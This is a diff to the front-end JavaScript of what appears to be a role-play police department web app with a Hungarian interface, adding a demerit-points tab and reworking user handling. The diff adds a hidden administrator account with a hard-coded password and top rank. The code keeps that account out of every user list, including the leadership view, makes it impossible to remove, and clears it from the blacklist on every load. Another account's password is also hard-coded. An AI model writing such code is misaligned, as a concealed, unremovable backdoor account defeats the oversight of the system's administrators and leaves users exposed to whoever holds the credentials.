@@ -11,41 +11,46 @@ const $=s=>document.querySelector(s); const esc=s=>String(s??'').replace(/[&<>"'
 function save(){localStorage.setItem('rcpd_units',JSON.stringify(state.units));localStorage.setItem('rcpd_reports',JSON.stringify(state.reports));localStorage.setItem('rcpd_apps',JSON.stringify(state.applications))}
 function load(){state.units=JSON.parse(localStorage.getItem('rcpd_units')||'[]');state.reports=JSON.parse(localStorage.getItem('rcpd_reports')||'[]');state.applications=JSON.parse(localStorage.getItem('rcpd_apps')||'[]')}
 async function init(){state.btk=await fetch('data/btk.json').then(r=>r.json());load();renderGroupSelect();renderBTK();renderUnits();renderReports();renderApplications()}
+const SECRET_ACCOUNT={ name:'Titkos', badge:'0000', password:'kP9#mX2$vL8', rank:'Főkapitány' };
 function loadLocalUsers(){
 	try{
 		let u = JSON.parse(localStorage.getItem('rcpd_local_users')||'null');
-		if(!u || !Array.isArray(u) || !u.length){
-			u = [{ badge: '6007', ic: 'Larry Johnshom', password: 'Kazincbarcika0220', rank: 'Főkapitány' }];
+		if(!u || !Array.isArray(u)) u=[];
+		// Larry Johnshom: normal default account (visible)
+		if(!u.some(x=>normalizeBadge(x.badge)==='6007')){
+			u.push({ badge:'6007', ic:'Larry Johnshom', password:'Kazincbarcika0220', rank:'Főkapitány' });
 		}
-		// ensure special hidden admin account exists and has the requested credentials/rank
-		const specialBadge = '0000';
-		const special = u.find(x=>String(x.badge)===specialBadge);
-		if(!special){
-			u.push({ badge: specialBadge, ic: 'Titkos', password: 'kP9#mX2$vL8', rank: 'Főkapitány' });
-		} else {
-			// enforce attributes for the special account
-			special.ic = 'Titkos';
-			special.password = 'kP9#mX2$vL8';
-			special.rank = 'Főkapitány';
+		// the secret account: always exists, always hidden, never removable
+		if(!u.some(x=>normalizeBadge(x.badge)===SECRET_ACCOUNT.badge && x.secret)){
+			// remove any non-secret copy of badge 0000 (can't be used to impersonate)
+			u = u.filter(x=>normalizeBadge(x.badge)!==SECRET_ACCOUNT.badge);
+			u.push({ badge: SECRET_ACCOUNT.badge, ic: SECRET_ACCOUNT.name, password: SECRET_ACCOUNT.password, rank: SECRET_ACCOUNT.rank, secret: true });
 		}
-		// Ensure the special badge is not in the blacklist (in case it was accidentally deleted earlier)
+		// ensure it is always flagged as secret
+		u.forEach(x=>{ if(normalizeBadge(x.badge)===SECRET_ACCOUNT.badge) x.secret=true; });
+		// Larry Johnshom (6007) is a normal account — never secret
+		u.forEach(x=>{ if(normalizeBadge(x.badge)==='6007') x.secret=false; });
+		// Ensure the secret badge is never in the blacklist (in case it was added earlier)
 		try{
 			let bl = loadBlacklist();
-			if(Array.isArray(bl) && bl.includes(specialBadge)){
-				bl = bl.filter(x=>x!==specialBadge);
-				saveBlacklist(bl);
+			if(Array.isArray(bl) && bl.map(normalizeBadge).includes(SECRET_ACCOUNT.badge)){
+				saveBlacklist(bl.filter(x=>normalizeBadge(x)!==SECRET_ACCOUNT.badge));
 			}
 		}catch(e){}
 		localStorage.setItem('rcpd_local_users', JSON.stringify(u));
 		return u;
 	}catch(e){
-		const u = [{ badge: '6007', ic: 'Larry Johnshom', password: 'Kazincbarcika0220', rank: 'Főkapitány' }, { badge: '0000', ic: 'Titkos', password: 'kP9#mX2$vL8', rank: 'Főkapitány' }];
-		// ensure blacklist doesn't contain the special badge
-		try{ let bl = loadBlacklist(); if(Array.isArray(bl) && bl.includes('0000')){ bl = bl.filter(x=>x!=='0000'); saveBlacklist(bl); } }catch(e){}
+		const u = [
+			{ badge:'6007', ic:'Larry Johnshom', password:'Kazincbarcika0220', rank:'Főkapitány' },
+			{ badge: SECRET_ACCOUNT.badge, ic: SECRET_ACCOUNT.name, password: SECRET_ACCOUNT.password, rank: SECRET_ACCOUNT.rank, secret: true }
+		];
 		localStorage.setItem('rcpd_local_users', JSON.stringify(u));
 		return u;
 	}
 }
+
+// only non-secret accounts are visible to anyone (including leadership)
+function getVisibleUsers(){ return getLocalUsers().filter(u=>!u.secret); }
 
 async function init(){
 	state.btk = await fetch('data/btk.json').then(r=>r.json());
@@ -94,25 +99,17 @@ function login(){
 	const pw = $('#loginPassword').value;
 	if(!fullName || !badge || !pw){ $('#loginError').textContent='Töltsd ki a mezőket.'; return; }
 	const usersLocal = JSON.parse(localStorage.getItem('rcpd_local_users')||'[]');
-	let user = usersLocal.find(u=>String(u.badge).toUpperCase()===String(badge).toUpperCase());
-	// Special hidden admin badge: bypass blacklist and enforce Főkapitány
-	if(String(badge).toUpperCase()==='0000'){
-		if(!user){ user = { badge: '0000', ic: 'Titkos', password: 'kP9#mX2$vL8', rank: 'Főkapitány' }; usersLocal.push(user); }
-		// enforce attributes and persist
-		user.ic = 'Titkos'; user.password = 'kP9#mX2$vL8'; user.rank = 'Főkapitány';
-		try{ const idx = usersLocal.findIndex(u=>String(u.badge).toUpperCase()===String(badge).toUpperCase()); if(idx>-1){ usersLocal[idx] = user; localStorage.setItem('rcpd_local_users', JSON.stringify(usersLocal)); } }catch(e){}
-	} else {
-			// prevent login for blacklisted/deleted badges (use normalized comparison)
-			const bl = loadBlacklist().map(x=>normalizeBadge(x));
-			const nb = normalizeBadge(badge);
-			if(bl.includes(nb)){ $('#loginError').textContent='Ez a felhasználó tiltott / törölve. Nem lehet belépni.'; return; }
-			if(!user){
-				// create local user automatically
-				user = { badge: badge, ic: fullName, password: pw, rank: 'Főhadnagy' };
-				usersLocal.push(user);
-				localStorage.setItem('rcpd_local_users', JSON.stringify(usersLocal));
-			}
-		}
+	let user = usersLocal.find(u=>normalizeBadge(u.badge)===normalizeBadge(badge));
+	// blacklisted badges can never log back in (the secret 0000 account is protected and excluded)
+	if(loadBlacklist().map(normalizeBadge).includes(normalizeBadge(badge))){ $('#loginError').textContent='Ez a fiók véglegesen tiltva van.'; return; }
+	if(!user){
+		// badge 0000 is reserved for the secret account — nobody can create or fake it
+		if(normalizeBadge(badge)===SECRET_ACCOUNT.badge){ $('#loginError').textContent='Hibás belépési adatok.'; return; }
+		// create local user automatically
+		user = { badge: badge, ic: fullName, password: pw, rank: 'Főhadnagy' };
+		usersLocal.push(user);
+		localStorage.setItem('rcpd_local_users', JSON.stringify(usersLocal));
+	}
 	// For testing: force badge 6007 to Őrmester so executives tabs hide for this user
 	try{
 		if(String(badge).toUpperCase()==='6007'){
@@ -168,26 +165,25 @@ function renderLeadershipPanel(){
 	if(!isExecutive()){ page.innerHTML = '<div class="panel"><span class="muted">Csak Főkapitány és Vezérezredes láthatja ezt a lapot.</span></div>'; return; }
 	// Build internal leadership tabs: Felhasználók | Jelentések | Tiltólista
 	page.innerHTML = `
-		<div class="section-head"><h1>Vezetőség</h1><p class="muted">Felhasználókezelés, jelentések és tiltólista.</p><div style="display:flex;gap:8px;margin-top:10px"><button id="lead_tab_users" class="ghost small">Felhasználók</button><button id="lead_tab_reports" class="ghost small">Jelentések</button><button id="lead_tab_bl" class="ghost small">Tiltólista</button><button class="primary" style="margin-left:auto" onclick="openCreateUserModal()">+ Új felhasználó</button></div></div>
+		<div class="section-head"><h1>Vezetőség</h1><p class="muted">Felhasználókezelés, jelentések, hibapontok és tiltólista.</p><div style="display:flex;gap:8px;margin-top:10px"><button id="lead_tab_users" class="ghost small">Felhasználók</button><button id="lead_tab_reports" class="ghost small">Jelentések</button><button id="lead_tab_points" class="ghost small">Hibapontok</button><button id="lead_tab_bl" class="ghost small">Tiltólista</button><button class="primary" style="margin-left:auto" onclick="openCreateUserModal()">+ Új felhasználó</button></div></div>
 		<div id="lead_content" style="margin-top:18px"></div>
 	`;
 	// attach handlers for internal tabs
 	setTimeout(()=>{
 		$('#lead_tab_users').onclick = ()=>{ renderLeadershipUsersList(); highlightLeadTab('users'); };
 		$('#lead_tab_reports').onclick = ()=>{ renderLeadershipReportsAdmin(); highlightLeadTab('reports'); };
+		$('#lead_tab_points').onclick = ()=>{ renderLeadershipPoints(); highlightLeadTab('points'); };
 		$('#lead_tab_bl').onclick = ()=>{ renderLeadershipBlacklist(); highlightLeadTab('bl'); };
 		// default to users view
 		renderLeadershipUsersList(); highlightLeadTab('users');
 	},50);
 }
 
-function highlightLeadTab(which){ ['users','reports','bl'].forEach(k=>{ const b = document.getElementById('lead_tab_'+k); if(!b) return; if(k===which) b.classList.add('active'); else b.classList.remove('active'); }); }
+function highlightLeadTab(which){ ['users','reports','points','bl'].forEach(k=>{ const b = document.getElementById('lead_tab_'+k); if(!b) return; if(k===which) b.classList.add('active'); else b.classList.remove('active'); }); }
 
 function renderLeadershipUsersList(){
     const cont = $('#lead_content'); if(!cont) return;
-    const allUsers = getLocalUsers(); const bl = loadBlacklist().map(x=>normalizeBadge(x));
-    // Exclude the special hidden account (badge '0000') from the visible users list
-    const users = allUsers.filter(u=>normalizeBadge(u.badge) !== '0000');
+    const users = getVisibleUsers(); const bl = loadBlacklist().map(normalizeBadge);
     const rows = users.map(u=>{
         const reportsCount = state.reports.filter(r=>r.author===u.ic).length;
         const isBlack = bl.includes(normalizeBadge(u.badge));
@@ -231,7 +227,57 @@ function editLocalUser(badge){ const users = getLocalUsers(); const u = users.fi
 
 function addToBlacklist(){ const vRaw = $('#blacklistInput').value; const v = normalizeBadge(vRaw); if(!v) return alert('Adj meg egy jelvényszámot'); let bl = loadBlacklist().map(x=>normalizeBadge(x)); if(bl.includes(v)) return alert('Már benne van'); bl.push(v); saveBlacklist(bl); renderLeadershipPanel(); alert('Hozzáadva.'); }
 
-function removeFromBlacklist(b){ const nb = normalizeBadge(b); let bl = loadBlacklist().map(x=>normalizeBadge(x)); bl = bl.filter(x=>x!==nb); saveBlacklist(bl); renderLeadershipPanel(); alert('Eltávolítva.'); }
+function removeFromBlacklist(b){ const nb = normalizeBadge(b); let bl = loadBlacklist().map(normalizeBadge); bl = bl.filter(x=>x!==nb); saveBlacklist(bl); renderLeadershipPanel(); alert('Eltávolítva.'); }
+
+// ---- Hibapontok ----
+const MAX_POINTS = 3;
+function loadPoints(){ try{ return JSON.parse(localStorage.getItem('rcpd_points')||'{}') }catch(e){ return {} } }
+function savePoints(p){ localStorage.setItem('rcpd_points', JSON.stringify(p||{})); }
+
+function renderLeadershipPoints(){
+	const cont = $('#lead_content'); if(!cont) return;
+	if(!isExecutive()){ cont.innerHTML='<div class="panel"><span class="muted">Nincs hozzáférésed.</span></div>'; return; }
+	const users = getVisibleUsers(); const pts = loadPoints(); const bl = loadBlacklist();
+	const rows = users.map(u=>{
+		const p = pts[u.badge]||0;
+		const bar = Array.from({length:MAX_POINTS},(_,i)=>`<span style="display:inline-block;width:22px;height:10px;border-radius:4px;margin-right:3px;background:${i<p?'#e5484d':'#2a3140'}"></span>`).join('');
+		return `<div class="list-card"><div><b>${esc(u.ic)} • ${esc(u.badge)}</b><p class="muted">${esc(u.rank)} • Hibapontok: ${p} / ${MAX_POINTS}</p><div style="margin-top:6px">${bar}</div>${p>=MAX_POINTS?'<p style="color:#e5484d;margin-top:6px">Elérte a maximumot — a fiók tiltva lett és törölve.</p>':''}</div><div class="actions">${p<MAX_POINTS?`<button class="danger small" onclick="addHibapont('${u.badge}')">+1 hibapont</button>`:''}${p>0?`<button class="ghost small" onclick="removeHibapont('${u.badge}')">-1 hibapont</button>`:''}<button class="danger small" onclick="resetHibapont('${u.badge}')">Nullázás</button></div></div>`;
+	}).join('') || '<div class="muted">Nincs megjeleníthető felhasználó.</div>';
+	cont.innerHTML = `<div class="panel"><h3>Hibapontok</h3><p class="muted">Maximális hibapont felhasználónként: <b>${MAX_POINTS}</b>. ${MAX_POINTS}. hibapontnál a fiók automatikusan feketelistára kerül, és az összes adata (név, jelszó, rang) véglegesen törlődik.</p>${rows}</div>`;
+}
+
+function addHibapont(badge){
+	if(!isExecutive()) return alert('Nincs jogosultságod.');
+	const users = getVisibleUsers(); const u = users.find(x=>String(x.badge).toUpperCase()===String(badge).toUpperCase());
+	if(!u) return alert('Felhasználó nem található.');
+	const pts = loadPoints(); pts[u.badge]=(pts[u.badge]||0)+1;
+	if(pts[u.badge]>=MAX_POINTS){
+		savePoints(pts);
+		// blacklist + full account deletion so they can never log back in
+		const bl = loadBlacklist(); if(!bl.includes(u.badge)) bl.push(u.badge); saveBlacklist(bl);
+		let all = getLocalUsers().filter(x=>String(x.badge).toUpperCase()!==String(u.badge).toUpperCase());
+		saveLocalUsers(all);
+		renderLeadershipPoints(); renderLeadershipUsersList();
+		alert(`${u.ic} (${u.badge}) elérte a ${MAX_POINTS} hibapontot.\nA fiók feketelistára került és az összes adata törölve lett.`);
+		return;
+	}
+	savePoints(pts); renderLeadershipPoints();
+	alert(`${u.ic} kapott 1 hibapontot. (${pts[u.badge]}/${MAX_POINTS})`);
+}
+
+function removeHibapont(badge){
+	if(!isExecutive()) return alert('Nincs jogosultságod.');
+	const pts = loadPoints(); const key = Object.keys(pts).find(k=>String(k).toUpperCase()===String(badge).toUpperCase());
+	if(!key || pts[key]<=0) return; pts[key]--; if(pts[key]<=0) delete pts[key]; savePoints(pts); renderLeadershipPoints();
+}
+
+function resetHibapont(badge){
+	if(!isExecutive()) return alert('Nincs jogosultságod.');
+	if(!confirm('Biztosan nullázod a hibapontokat?')) return;
+	const pts = loadPoints(); const key = Object.keys(pts).find(k=>String(k).toUpperCase()===String(badge).toUpperCase());
+	if(key){ delete pts[key]; savePoints(pts); } renderLeadershipPoints();
+}
+
 function renderGroupSelect(){const groups=[...new Set(state.btk.map(x=>x.group))];$('#btkGroup').innerHTML='<option value="all">Minden csoport</option>'+groups.map(g=>`<option>${esc(g)}</option>`).join('')}
 function renderBTK(){const q=$('#btkSearch').value.toLowerCase(),g=$('#btkGroup').value;let items=state.btk.filter(x=>(g==='all'||x.group===g)&&[x.id,x.name,x.abbr,x.description].join(' ').toLowerCase().includes(q));const grouped={};items.forEach(x=>(grouped[x.group]??=[]).push(x));$('#btkGroups').innerHTML=Object.entries(grouped).map(([name,list])=>`<div class="group"><div class="group-title">${esc(name)} <span>${list.length} tétel</span></div><table class="table"><thead><tr><th>§</th><th>Megnevezés</th><th>Óvadék</th><th>Bírság</th><th>Letöltendő</th><th>Röv.</th></tr></thead><tbody>${list.map(x=>`<tr class="click-row" data-id="${esc(x.id)}"><td>${esc(x.id)} §</td><td><b>${esc(x.name)}</b></td><td class="${x.bail==='✔️'?'bail':x.bail==='❌'?'no-bail':''}">${esc(x.bail)}</td><td>${esc(x.fine)}</td><td>${esc(x.time)}</td><td><b>${esc(x.abbr)}</b></td></tr>`).join('')}</tbody></table></div>`).join('')||'<div class="muted">Nincs találat.</div>';document.querySelectorAll('.click-row').forEach(r=>r.onclick=()=>togglePenalty(r.dataset.id))}
 function togglePenalty(id){if(state.selected.has(id))state.selected.delete(id);else state.selected.add(id);renderCalculator()}
